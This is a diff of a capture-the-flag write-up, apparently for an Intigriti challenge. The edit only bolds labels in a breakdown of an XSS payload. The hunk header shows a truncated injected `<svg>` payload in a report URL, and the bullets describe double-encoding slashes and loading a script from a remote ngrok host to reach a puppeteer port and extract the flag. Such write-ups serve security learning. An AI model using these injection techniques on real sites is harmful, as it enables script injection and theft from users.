@@ -92,9 +92,9 @@ https://challenge-1023.intigriti.io/api/report?url=/<svg><b id="<%2526%2523x2f%2
 ```
 Let's break it down:
 
-- Path and Parameters: It begins with `<svg><b id="`, introducing a closing `</title>` tag. For the payload to work, it was needed to encode any slashes present in it by HTML encoding `/` -> `&#x2f;` -> URL encoding twice -> `%2526%2523x2f%253b`.
-- Injected Script: The payload injects a script with a src attribute pointing to a remote server (https://a9b1-191-45-70-141.ngrok-free.app) hosting the 404.js script. This script is our entry point into the puppeteer exploit.
-- Query Parameter startPort: The payload introduces the query parameter startPort=40000 (typically ranging between 45000 and 35000), serving as an initial estimation of the puppeteer port. The exploit involves an iterative process, maybe requiring multiple attempts to identify the correct port and extract the flag.
+- **Path and Parameters**: It begins with `<svg><b id="`, introducing a closing `</title>` tag. For the payload to work, it was needed to encode any slashes present in it by HTML encoding `/` -> `&#x2f;` -> URL encoding twice -> `%2526%2523x2f%253b`.
+- **Injected Script**: The payload injects a script with a src attribute pointing to a remote server (https://a9b1-191-45-70-141.ngrok-free.app) hosting the 404.js script. This script is our entry point into the puppeteer exploit.
+- **Query Parameter startPort**: The payload introduces the query parameter startPort=40000 (typically ranging between 45000 and 35000), serving as an initial estimation of the puppeteer port. The exploit involves an iterative process, maybe requiring multiple attempts to identify the correct port and extract the flag.
 
 ### Streamlining Port Extraction
 
